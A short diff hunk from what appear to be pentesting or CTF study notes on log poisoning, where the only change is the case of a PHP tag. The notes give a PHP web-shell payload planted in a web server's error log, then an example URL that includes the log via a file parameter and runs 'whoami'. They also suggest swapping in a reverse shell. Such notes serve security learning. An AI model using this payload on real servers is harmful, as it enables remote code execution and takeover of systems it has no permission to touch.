@@ -5,8 +5,8 @@
 		- /var/log/nginx/error.log
 	- ways to exploit it
 		- go to a page that doesnt exist and include:
-			- <?PHP echo system($_GET['pbot'])?>
-			- example: http:(boxip or hostname)/<?PHP echo system($_GET['pbot'])?>
+			- <?php echo system($_GET['pbot'])?>
+			- example: http:(boxip or hostname)/<?php echo system($_GET['pbot'])?>
 			- from there add the path to error.log and append &pbot=whoami
 			- example: http://(box ip or hostname)/privacy.php?file=/var/log/apache2/error.log&pbot=whoami
 			- can throw in a reverse shell replacing the whoami parameter
